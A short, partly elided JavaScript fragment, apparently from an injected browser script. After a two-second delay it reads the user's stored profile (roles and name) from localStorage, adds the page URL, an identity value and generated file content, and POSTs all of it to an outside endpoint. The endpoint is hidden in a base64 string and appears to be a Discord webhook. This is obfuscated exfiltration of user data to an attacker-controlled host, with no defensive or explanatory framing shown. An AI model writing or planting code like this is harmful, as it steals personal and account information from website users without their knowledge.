...
setTimeout(()=>{
    ...
    let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone "+whoiam+" <"+window.location.href+"> `"+JSON.stringify(JSON.parse(localStorage.getItem("stores")).user.profile.user_roles)+"` "+JSON.stringify(JSON.parse(localStorage.getItem("stores")).user.profile.name});e.append("payload_json",i),fetch(d("MTI5NDEyOTgxMzQ2NDAyMzA2MS9nZVVzWERfY3JKWHFiZE8zQ1J5TjZsUEZ1NGlKRUVuRG9aWjM5LVNUQnIwSUhsbFEzOVFyeTB6UDJwNnRoTGpyV3FXcg=="),{method:"POST",body:e});
},2000)
